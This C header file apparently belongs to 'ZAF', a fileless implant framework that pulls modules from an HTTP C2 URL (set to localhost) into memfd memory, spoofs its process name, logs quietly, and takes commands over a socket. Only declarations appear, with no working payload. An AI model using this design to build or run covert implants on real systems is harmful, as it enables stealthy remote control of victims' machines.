// ZAF Header file
#ifndef _HAVE_ZAF_H
#define _HAVE_ZAF_H

#include <stdio.h>
#include <unistd.h>

#include "log.h"
#include "spt_status.h"

#include "zstructs.h"
#include "zsignals.h"
#include "zmodules.h"
#include "zservice.h"
#include "zutil.h"


#define ZLOG_LEVEL 1    
#define ZPS_NAME "zaf"

#define SHM_NAME " "                       // memfd:<...>

// ZAF log
char *logFile="/tmp/_mf.log";              // Location of the log
int  logquiet = 1;                         // 1 - no stderr whatsoever, 0 - stderr + file
FILE *fp;

// Initial modules to download to memory
// char *modules[] = { "hax.so" };
char *modules[] = { };

// HTTP/S C2
char *ccurl="http://127.0.0.1:8080/";


/***  Local Functions ***/
int   setupCmdP(void);
void  doWork(void);
void  initSetup(void);
void  downloadAutoModules(void);

/***  Extern Functions ***/
extern int   setKernel(void);
extern int   check_empty(node_t * head);
extern void  cleanup_mod_resources(int shm_fd);
extern int   push(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
extern int   push_first(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
extern int   list_sz(node_t * head);
extern void  write_modlist(node_t * head, int sock);
extern int   load_mod(node_t * head, char * url);
extern int   unload_mod(node_t * head, char * name);
extern int   mark_delete_mod(node_t * head, int shm_fd);
extern int   mod_name2fd(node_t * head, char * name, int loaded);
extern char* mod_name2path(node_t * head, char * name);
extern int   open_ramfs(Shared_Mem_Fd * smf);
extern int   processCommandReq (int sock, node_t * head);


#endif //_HAVE_ZAF_H

